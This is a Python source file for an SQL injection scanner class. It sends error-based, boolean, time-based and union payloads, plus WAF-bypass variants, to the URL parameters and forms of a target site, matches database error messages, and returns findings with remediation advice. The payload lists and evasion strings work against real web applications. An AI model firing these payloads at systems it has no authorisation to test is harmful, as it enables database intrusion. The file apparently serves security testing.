"""
SQL Injection Scanner Service
Detects various types of SQL injection vulnerabilities
"""

import re
import time
import random
import string
import concurrent.futures
from typing import List, Dict, Optional, Callable, Any, Set, Tuple
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urljoin
import threading
import requests
from bs4 import BeautifulSoup

from app.services.utils import (
    normalize_url,
    make_request,
    generate_scan_id,
    load_wordlist,
    get_base_url,
    extract_params
)


class SQLiScanner:
    """
    SQL Injection Vulnerability Scanner
    
    Features:
    - Error-based SQL injection detection
    - Boolean-based blind SQL injection
    - Time-based blind SQL injection
    - Union-based SQL injection
    - Multiple database support (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
    - Form and URL parameter testing
    - Custom payload support
    - WAF bypass techniques
    """
    
    # SQL Error Patterns by Database
    SQL_ERRORS = {
        'MySQL': [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc\.exceptions",
            r"MySQLSyntaxErrorException",
            r"SQLSTATE\[42000\]",
            r"MySQL Query fail",
            r"mysqli_",
            r"mysql_fetch_array\(\)",
            r"Unclosed quotation mark",
            r"You have an error in your SQL syntax"
        ],
        'PostgreSQL': [
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"SQLSTATE\[42601\]",
            r"syntax error at or near",
            r"PostgreSQL query failed",
            r"pg_query\(\)",
            r"pg_exec\(\)"
        ],
        'MSSQL': [
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"Exception.*\WSystem\.Data\.SqlClient\.",
            r"com\.microsoft\.sqlserver\.jdbc",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Incorrect syntax near"
        ],
        'Oracle': [
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*",
            r"oracle\.jdbc\.driver",
            r"OracleException",
            r"quoted string not properly terminated"
        ],
        'SQLite': [
            r"SQLite\/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite error",
            r"SQLITE_CONSTRAINT"
        ],
        'DB2': [
            r"CLI Driver.*DB2",
            r"DB2 SQL error",
            r"db2_\w+\(",
            r"SQLSTATE\[42S02\]",
            r"SQLCODE"
        ],
        'Generic': [
            r"SQL syntax error",
            r"SQL error",
            r"syntax error",
            r"unterminated quoted string",
            r"unexpected end of SQL command",
            r"Invalid column name",
            r"Unknown column",
            r"Invalid object name",
            r"ORA-\d{5}",
            r"PLS-\d{5}",
            r"quoted string not properly terminated"
        ]
    }
    
    # Error-based Payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        '"',
        '""',
        "`",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        '" OR "1"="1',
        '" OR "1"="1"--',
        "1' AND '1'='1",
        "1' AND '1'='2",
        "admin'--",
        "admin'#",
        "' HAVING 1=1--",
        "' GROUP BY 1--",
        "' ORDER BY 1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "1' ORDER BY 100--",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
        "1;SELECT 1",
        "1; SELECT pg_sleep(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ]
    
    # Boolean-based Payloads
    BOOLEAN_PAYLOADS = [
        # True conditions
        ("' OR '1'='1", "' OR '1'='2"),
        ("' OR 1=1--", "' OR 1=2--"),
        ('" OR "1"="1', '" OR "1"="2'),
        (" OR 1=1", " OR 1=2"),
        ("' OR 'a'='a", "' OR 'a'='b"),
        ("1' OR '1'='1'--", "1' OR '1'='2'--"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("' OR ''='", "' OR ''='x"),
        ("') OR ('1'='1", "') OR ('1'='2"),
        ("1') OR ('1'='1", "1') OR ('1'='2"),
    ]
    
    # Time-based Payloads by Database
    TIME_PAYLOADS = {
        'MySQL': [
            "' AND SLEEP({time})--",
            "' AND SLEEP({time})#",
            "1' AND SLEEP({time})--",
            "\" AND SLEEP({time})--",
            "') AND SLEEP({time})--",
            "1 AND SLEEP({time})",
            "' OR SLEEP({time})--",
            "' AND BENCHMARK(10000000,SHA1('test'))--",
            "1' AND (SELECT SLEEP({time}))--",
            "1' AND (SELECT * FROM (SELECT SLEEP({time}))a)--"
        ],
        'PostgreSQL': [
            "'; SELECT pg_sleep({time})--",
            "' AND pg_sleep({time})--",
            "1; SELECT pg_sleep({time})--",
            "' OR pg_sleep({time})--",
            "\" AND pg_sleep({time})--",
            "1 AND (SELECT pg_sleep({time}))--"
        ],
        'MSSQL': [
            "'; WAITFOR DELAY '0:0:{time}'--",
            "' WAITFOR DELAY '0:0:{time}'--",
            "1; WAITFOR DELAY '0:0:{time}'--",
            "' AND WAITFOR DELAY '0:0:{time}'--",
            "1 AND WAITFOR DELAY '0:0:{time}'--",
            "\"; WAITFOR DELAY '0:0:{time}'--"
        ],
        'Oracle': [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
            "1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3)--"
        ],
        'SQLite': [
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({time}00000000))))--",
            "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({time}00000000))))--"
        ]
    }
    
    # Union-based Payloads
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        " UNION SELECT NULL--",
        " UNION SELECT NULL,NULL--",
        " UNION SELECT NULL,NULL,NULL--",
        "') UNION SELECT NULL--",
        "') UNION SELECT NULL,NULL--",
        "')) UNION SELECT NULL--",
    ]
    
    # WAF Bypass Payloads
    WAF_BYPASS_PAYLOADS = [
        # Case manipulation
        "' oR '1'='1",
        "' Or '1'='1",
        "' OR '1'='1",
        # Comment injection
        "'/**/OR/**/'1'='1",
        "'/**/OR/**/1=1--",
        # URL encoding
        "%27%20OR%20%271%27%3D%271",
        # Double encoding
        "%2527%2520OR%2520%25271%2527%253D%25271",
        # Null bytes
        "' OR%001=1--",
        # Concatenation
        "' OR 'a'='a",
        "' OR 'ab'='a'+'b",
        # Alternative syntax
        "' || '1'='1",
        "' && '1'='1",
        # Hex encoding
        "' OR 0x31=0x31--",
        # Function obfuscation
        "' OR CHAR(49)=CHAR(49)--",
        # Whitespace alternatives
        "'\t\nOR\t\n'1'='1",
        "'\rOR\r'1'='1",
    ]
    
    def __init__(
        self,
        target_url: str,
        timeout: float = 10.0,
        time_delay: int = 5,
        max_threads: int = 5,
        user_agent: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        proxy: Optional[str] = None
    ):
        """
        Initialize SQLi Scanner
        
        Args:
            target_url: Target URL to scan
            timeout: Request timeout in seconds
            time_delay: Delay for time-based injection (seconds)
            max_threads: Maximum concurrent threads
            user_agent: Custom User-Agent header
            cookies: Cookies to include in requests
            headers: Custom headers to include
            proxy: Proxy server URL
        """
        self.target_url = normalize_url(target_url)
        self.base_url = get_base_url(self.target_url)
        self.timeout = timeout
        self.time_delay = time_delay
        self.max_threads = max_threads
        self.scan_id = generate_scan_id()
        
        # Session configuration
        self.session = requests.Session()
        self.session.verify = False
        
        # Set headers
        self.headers = {
            'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        if headers:
            self.headers.update(headers)
        
        self.session.headers.update(self.headers)
        
        # Set cookies
        if cookies:
            self.session.cookies.update(cookies)
        
        # Set proxy
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Scan state
        self.vulnerabilities: List[Dict] = []
        self.is_scanning = False
        self.stop_scan = False
        self._lock = threading.Lock()
        
        # Baseline response for comparison
        self.baseline_response = None
        self.baseline_length = 0
    
    def _get_baseline(self, url: str, method: str = 'GET', data: Optional[Dict] = None) -> None:
        """Get baseline response for comparison"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=self.timeout)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            self.baseline_response = response
            self.baseline_length = len(response.text)
        except Exception:
            self.baseline_response = None
            self.baseline_length = 0
    
    def _detect_sql_error(self, response_text: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Detect SQL error in response
        
        Returns:
            Tuple[bool, Optional[str], Optional[str]]: (has_error, database_type, error_message)
        """
        for db_type, patterns in self.SQL_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return True, db_type, match.group(0)
        
        return False, None, None
    
    def _compare_responses(
        self,
        response1: requests.Response,
        response2: requests.Response,
        threshold: float = 0.1
    ) -> bool:
        """
        Compare two responses to detect significant differences
        
        Returns:
            bool: True if responses are significantly different
        """
        # Compare status codes
        if response1.status_code != response2.status_code:
            return True
        
        # Compare content length
        len1 = len(response1.text)
        len2 = len(response2.text)
        
        if len1 == 0 and len2 == 0:
            return False
        
        diff_ratio = abs(len1 - len2) / max(len1, len2)
        if diff_ratio > threshold:
            return True
        
        # Compare content (simple check)
        if response1.text != response2.text:
            # Check for structural differences
            # Remove dynamic content (numbers, dates, etc.)
            clean1 = re.sub(r'\d+', '', response1.text)
            clean2 = re.sub(r'\d+', '', response2.text)
            
            if len(clean1) > 0:
                diff_ratio = abs(len(clean1) - len(clean2)) / len(clean1)
                if diff_ratio > threshold:
                    return True
        
        return False
    
    def test_error_based(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = 'GET'
    ) -> Optional[Dict[str, Any]]:
        """
        Test for error-based SQL injection
        
        Returns:
            Dict with vulnerability info if found
        """
        for payload in self.ERROR_PAYLOADS[:15]:  # Limit payloads
            if self.stop_scan:
                return None
            
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Build test value
                test_value = param_value + payload
                
                if method.upper() == 'GET':
                    new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    new_params[param_name] = test_value
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    if new_params:
                        test_url += '?' + urlencode(new_params)
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    post_data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    post_data[param_name] = test_value
                    
                    response = self.session.post(url, data=post_data, timeout=self.timeout)
                
                # Check for SQL errors
                has_error, db_type, error_msg = self._detect_sql_error(response.text)
                
                if has_error:
                    return {
                        'vulnerable': True,
                        'type': 'Error-based SQL Injection',
                        'technique': 'error-based',
                        'url': url,
                        'method': method,
                        'parameter': param_name,
                        'payload': payload,
                        'database': db_type,
                        'error_message': error_msg,
                        'severity': 'critical',
                        'confidence': 'high',
                        'response_code': response.status_code
                    }
            
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        
        return None
    
    def test_boolean_based(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = 'GET'
    ) -> Optional[Dict[str, Any]]:
        """
        Test for boolean-based blind SQL injection
        
        Returns:
            Dict with vulnerability info if found
        """
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS[:5]:  # Limit payloads
            if self.stop_scan:
                return None
            
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                # Test true condition
                true_value = param_value + true_payload
                if method.upper() == 'GET':
                    new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    new_params[param_name] = true_value
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    if new_params:
                        test_url += '?' + urlencode(new_params)
                    
                    true_response = self.session.get(test_url, timeout=self.timeout)
                else:
                    post_data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    post_data[param_name] = true_value
                    true_response = self.session.post(url, data=post_data, timeout=self.timeout)
                
                # Test false condition
                false_value = param_value + false_payload
                if method.upper() == 'GET':
                    new_params[param_name] = false_value
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    if new_params:
                        test_url += '?' + urlencode(new_params)
                    
                    false_response = self.session.get(test_url, timeout=self.timeout)
                else:
                    post_data[param_name] = false_value
                    false_response = self.session.post(url, data=post_data, timeout=self.timeout)
                
                # Compare responses
                if self._compare_responses(true_response, false_response, threshold=0.05):
                    # Verify by comparing with baseline
                    if self.baseline_response:
                        true_diff = self._compare_responses(true_response, self.baseline_response, threshold=0.2)
                        false_diff = self._compare_responses(false_response, self.baseline_response, threshold=0.2)
                        
                        # True should be similar to baseline, false should be different
                        # OR true should have more content
                        if len(true_response.text) != len(false_response.text):
                            return {
                                'vulnerable': True,
                                'type': 'Boolean-based Blind SQL Injection',
                                'technique': 'boolean-based',
                                'url': url,
                                'method': method,
                                'parameter': param_name,
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'true_response_length': len(true_response.text),
                                'false_response_length': len(false_response.text),
                                'severity': 'critical',
                                'confidence': 'medium',
                                'response_code': true_response.status_code
                            }
            
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        
        return None
    
    def test_time_based(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = 'GET'
    ) -> Optional[Dict[str, Any]]:
        """
        Test for time-based blind SQL injection
        
        Returns:
            Dict with vulnerability info if found
        """
        # Test for each database type
        for db_type, payloads in self.TIME_PAYLOADS.items():
            if self.stop_scan:
                return None
            
            for payload_template in payloads[:2]:  # Limit payloads per DB
                if self.stop_scan:
                    return None
                
                try:
                    payload = payload_template.format(time=self.time_delay)
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    
                    test_value = param_value + payload
                    
                    # Measure baseline response time
                    start_baseline = time.time()
                    if method.upper() == 'GET':
                        new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        if new_params:
                            test_url += '?' + urlencode(new_params)
                        
                        self.session.get(test_url, timeout=self.timeout)
                    else:
                        post_data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        self.session.post(url, data=post_data, timeout=self.timeout)
                    
                    baseline_time = time.time() - start_baseline
                    
                    # Test with payload
                    start_test = time.time()
                    if method.upper() == 'GET':
                        new_params[param_name] = test_value
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        if new_params:
                            test_url += '?' + urlencode(new_params)
                        
                        response = self.session.get(test_url, timeout=self.timeout + self.time_delay + 5)
                    else:
                        post_data[param_name] = test_value
                        response = self.session.post(
                            url, 
                            data=post_data, 
                            timeout=self.timeout + self.time_delay + 5
                        )
                    
                    test_time = time.time() - start_test
                    
                    # Check if response was delayed
                    if test_time >= (baseline_time + self.time_delay - 1):
                        # Verify with second request
                        start_verify = time.time()
                        if method.upper() == 'GET':
                            self.session.get(test_url, timeout=self.timeout + self.time_delay + 5)
                        else:
                            self.session.post(url, data=post_data, timeout=self.timeout + self.time_delay + 5)
                        verify_time = time.time() - start_verify
                        
                        if verify_time >= (self.time_delay - 1):
                            return {
                                'vulnerable': True,
                                'type': 'Time-based Blind SQL Injection',
                                'technique': 'time-based',
                                'url': url,
                                'method': method,
                                'parameter': param_name,
                                'payload': payload,
                                'database': db_type,
                                'delay_seconds': self.time_delay,
                                'actual_delay': round(test_time, 2),
                                'baseline_time': round(baseline_time, 2),
                                'severity': 'critical',
                                'confidence': 'high',
                                'response_code': response.status_code
                            }
                
                except requests.exceptions.Timeout:
                    # Timeout might indicate successful injection
                    return {
                        'vulnerable': True,
                        'type': 'Time-based Blind SQL Injection',
                        'technique': 'time-based',
                        'url': url,
                        'method': method,
                        'parameter': param_name,
                        'payload': payload,
                        'database': db_type,
                        'delay_seconds': self.time_delay,
                        'severity': 'critical',
                        'confidence': 'medium',
                        'note': 'Request timed out - likely vulnerable'
                    }
                except requests.exceptions.RequestException:
                    continue
                except Exception:
                    continue
        
        return None
    
    def test_union_based(
        self,
        url: str,
        param_name: str,
        param_value: str,
        method: str = 'GET'
    ) -> Optional[Dict[str, Any]]:
        """
        Test for union-based SQL injection
        
        Returns:
            Dict with vulnerability info if found
        """
        for payload in self.UNION_PAYLOADS[:10]:  # Limit payloads
            if self.stop_scan:
                return None
            
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                
                test_value = param_value + payload
                
                if method.upper() == 'GET':
                    new_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    new_params[param_name] = test_value
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    if new_params:
                        test_url += '?' + urlencode(new_params)
                    
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    post_data = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    post_data[param_name] = test_value
                    
                    response = self.session.post(url, data=post_data, timeout=self.timeout)
                
                # Check for SQL errors (might reveal column count)
                has_error, db_type, error_msg = self._detect_sql_error(response.text)
                
                # Check if NULL or numbers appear in response (successful union)
                null_count = payload.count('NULL')
                if null_count > 0:
                    # Look for signs of successful union
                    if response.status_code == 200:
                        # Check if baseline response is different
                        if self.baseline_response:
                            if len(response.text) != self.baseline_length:
                                # Check for no error in response
                                if not has_error:
                                    return {
                                        'vulnerable': True,
                                        'type': 'Union-based SQL Injection',
                                        'technique': 'union-based',
                                        'url': url,
                                        'method': method,
                                        'parameter': param_name,
                                        'payload': payload,
                                        'columns_detected': null_count,
                                        'severity': 'critical',
                                        'confidence': 'medium',
                                        'response_code': response.status_code
                                    }
            
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
        
        return None
    
    def find_injection_points(self, url: str) -> Dict[str, Any]:
        """
        Find potential SQL injection points in URL and forms
        
        Returns:
            Dict containing URL parameters and form inputs
        """
        injection_points = {
            'url_params': [],
            'forms': [],
            'total_points': 0
        }
        
        try:
            # Get URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param_name, param_values in params.items():
                injection_points['url_params'].append({
                    'name': param_name,
                    'value': param_values[0] if param_values else '',
                    'method': 'GET'
                })
            
            # Get page and find forms
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Get all input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name')
                    if input_name:
                        input_type = input_tag.get('type', 'text')
                        input_value = input_tag.get('value', '')
                        
                        # Include text inputs, hidden fields, etc.
                        if input_type.lower() not in ['submit', 'button', 'image', 'reset']:
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type,
                                'value': input_value
                            })
                
                if form_data['inputs']:
                    injection_points['forms'].append(form_data)
            
            injection_points['total_points'] = (
                len(injection_points['url_params']) +
                sum(len(f['inputs']) for f in injection_points['forms'])
            )
        
        except Exception as e:
            injection_points['error'] = str(e)
        
        return injection_points
    
    def scan(
        self,
        method: str = 'GET',
        params: Optional[Dict[str, str]] = None,
        test_forms: bool = True,
        techniques: Optional[List[str]] = None,
        callback: Optional[Callable] = None
    ) -> Dict[str, Any]:
        """
        Perform SQL injection scan
        
        Args:
            method: HTTP method for testing
            params: Additional parameters to test
            test_forms: Test form inputs
            techniques: List of techniques to use ('error', 'boolean', 'time', 'union')
            callback: Progress callback(payload, vulnerable, details)
            
        Returns:
            Dict with scan results
        """
        start_time = datetime.now()
        self.is_scanning = True
        self.stop_scan = False
        self.vulnerabilities = []
        
        # Default techniques
        if techniques is None:
            techniques = ['error', 'boolean', 'time', 'union']
        
        # Find injection points
        injection_points = self.find_injection_points(self.target_url)
        
        # Get baseline response
        self._get_baseline(self.target_url, method)
        
        total_tests = 0
        vulnerable_params = []
        tested_params = set()
        
        # Test URL parameters
        for param in injection_points['url_params']:
            if self.stop_scan:
                break
            
            param_key = f"url:{param['name']}"
            if param_key in tested_params:
                continue
            tested_params.add(param_key)
            
            vuln_found = False
            
            # Test each technique
            if 'error' in techniques and not vuln_found:
                total_tests += 1
                result = self.test_error_based(
                    self.target_url,
                    param['name'],
                    param['value'],
                    'GET'
                )
                if result:
                    vuln_found = True
                    with self._lock:
                        self.vulnerabilities.append(result)
                        vulnerable_params.append(result)
                    
                    if callback:
                        try:
                            callback(result.get('payload', ''), True, result)
                        except Exception:
                            pass
            
            if 'boolean' in techniques and not vuln_found:
                total_tests += 1
                result = self.test_boolean_based(
                    self.target_url,
                    param['name'],
                    param['value'],
                    'GET'
                )
                if result:
                    vuln_found = True
                    with self._lock:
                        self.vulnerabilities.append(result)
                        vulnerable_params.append(result)
                    
                    if callback:
                        try:
                            callback(result.get('true_payload', ''), True, result)
                        except Exception:
                            pass
            
            if 'time' in techniques and not vuln_found:
                total_tests += 1
                result = self.test_time_based(
                    self.target_url,
                    param['name'],
                    param['value'],
                    'GET'
                )
                if result:
                    vuln_found = True
                    with self._lock:
                        self.vulnerabilities.append(result)
                        vulnerable_params.append(result)
                    
                    if callback:
                        try:
                            callback(result.get('payload', ''), True, result)
                        except Exception:
                            pass
            
            if 'union' in techniques and not vuln_found:
                total_tests += 1
                result = self.test_union_based(
                    self.target_url,
                    param['name'],
                    param['value'],
                    'GET'
                )
                if result:
                    with self._lock:
                        self.vulnerabilities.append(result)
                        vulnerable_params.append(result)
                    
                    if callback:
                        try:
                            callback(result.get('payload', ''), True, result)
                        except Exception:
                            pass
            
            if not vuln_found and callback:
                try:
                    callback('', False, {'parameter': param['name']})
                except Exception:
                    pass
        
        # Test forms
        if test_forms:
            for form in injection_points['forms']:
                if self.stop_scan:
                    break
                
                form_action = form['action']
                if form_action:
                    if not form_action.startswith('http'):
                        form_action = urljoin(self.target_url, form_action)
                else:
                    form_action = self.target_url
                
                form_method = form['method']
                
                for input_field in form['inputs']:
                    if self.stop_scan:
                        break
                    
                    param_key = f"form:{form_action}:{input_field['name']}"
                    if param_key in tested_params:
                        continue
                    tested_params.add(param_key)
                    
                    vuln_found = False
                    
                    # Test error-based (most common for forms)
                    if 'error' in techniques and not vuln_found:
                        total_tests += 1
                        result = self.test_error_based(
                            form_action,
                            input_field['name'],
                            input_field['value'],
                            form_method
                        )
                        if result:
                            vuln_found = True
                            result['form_action'] = form_action
                            with self._lock:
                                self.vulnerabilities.append(result)
                                vulnerable_params.append(result)
                            
                            if callback:
                                try:
                                    callback(result.get('payload', ''), True, result)
                                except Exception:
                                    pass
        
        end_time = datetime.now()
        self.is_scanning = False
        
        # Calculate risk score
        risk_score = self._calculate_risk_score()
        
        return {
            'success': True,
            'scan_id': self.scan_id,
            'target_url': self.target_url,
            'vulnerabilities': self.vulnerabilities,
            'total_found': len(self.vulnerabilities),
            'total_tests': total_tests,
            'injection_points': injection_points['total_points'],
            'techniques_used': techniques,
            'risk_score': risk_score,
            'severity_summary': self._get_severity_summary(),
            'databases_detected': self._get_databases_detected(),
            'start_time': start_time.isoformat(),
            'end_time': end_time.isoformat(),
            'duration': (end_time - start_time).total_seconds(),
            'timestamp': datetime.now().isoformat()
        }
    
    def _calculate_risk_score(self) -> int:
        """Calculate overall SQL injection risk score (0-100)"""
        if not self.vulnerabilities:
            return 0
        
        score = 0
        
        for vuln in self.vulnerabilities:
            technique = vuln.get('technique', '')
            confidence = vuln.get('confidence', 'low')
            
            # Base score by technique (all SQLi is critical)
            if technique == 'error-based':
                base = 40
            elif technique == 'time-based':
                base = 35
            elif technique == 'boolean-based':
                base = 30
            elif technique == 'union-based':
                base = 35
            else:
                base = 25
            
            # Adjust by confidence
            if confidence == 'high':
                multiplier = 1.0
            elif confidence == 'medium':
                multiplier = 0.8
            else:
                multiplier = 0.5
            
            score += base * multiplier
        
        return min(100, int(score))
    
    def _get_severity_summary(self) -> Dict[str, int]:
        """Get summary of vulnerabilities by severity"""
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'low').lower()
            if severity in summary:
                summary[severity] += 1
        
        return summary
    
    def _get_databases_detected(self) -> List[str]:
        """Get list of detected database types"""
        databases = set()
        for vuln in self.vulnerabilities:
            db = vuln.get('database')
            if db:
                databases.add(db)
        return list(databases)
    
    def stop(self) -> None:
        """Stop ongoing scan"""
        self.stop_scan = True
    
    def get_vulnerabilities(self) -> List[Dict]:
        """Get list of found vulnerabilities"""
        with self._lock:
            return list(self.vulnerabilities)
    
    def quick_scan(self, callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Perform quick SQL injection scan (error-based only)"""
        return self.scan(
            techniques=['error'],
            test_forms=False,
            callback=callback
        )
    
    def full_scan(self, callback: Optional[Callable] = None) -> Dict[str, Any]:
        """Perform full SQL injection scan with all techniques"""
        return self.scan(
            techniques=['error', 'boolean', 'time', 'union'],
            test_forms=True,
            callback=callback
        )
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate detailed SQL injection scan report"""
        return {
            'scan_id': self.scan_id,
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'severity_breakdown': self._get_severity_summary(),
                'risk_score': self._calculate_risk_score(),
                'databases_detected': self._get_databases_detected()
            },
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if self.vulnerabilities:
            recommendations.append("Use parameterized queries (prepared statements) for all database operations")
            recommendations.append("Implement input validation and sanitization on all user inputs")
            recommendations.append("Apply the principle of least privilege to database accounts")
            recommendations.append("Enable Web Application Firewall (WAF) with SQL injection rules")
            recommendations.append("Disable detailed database error messages in production")
            recommendations.append("Use stored procedures to limit direct SQL access")
            recommendations.append("Implement proper error handling that doesn't expose database information")
            recommendations.append("Consider using an ORM (Object-Relational Mapping) framework")
            recommendations.append("Regularly update and patch database software")
            recommendations.append("Conduct regular security audits and penetration testing")
            
            # Database-specific recommendations
            databases = self._get_databases_detected()
            
            if 'MySQL' in databases:
                recommendations.append("MySQL: Use mysqli or PDO with prepared statements instead of deprecated mysql_* functions")
            
            if 'MSSQL' in databases:
                recommendations.append("MSSQL: Use SqlParameter class for parameterized queries")
            
            if 'PostgreSQL' in databases:
                recommendations.append("PostgreSQL: Use PQexecParams() for parameterized queries in C/C++, or equivalent in other languages")
            
            if 'Oracle' in databases:
                recommendations.append("Oracle: Use bind variables in all SQL statements")
        
        return recommendations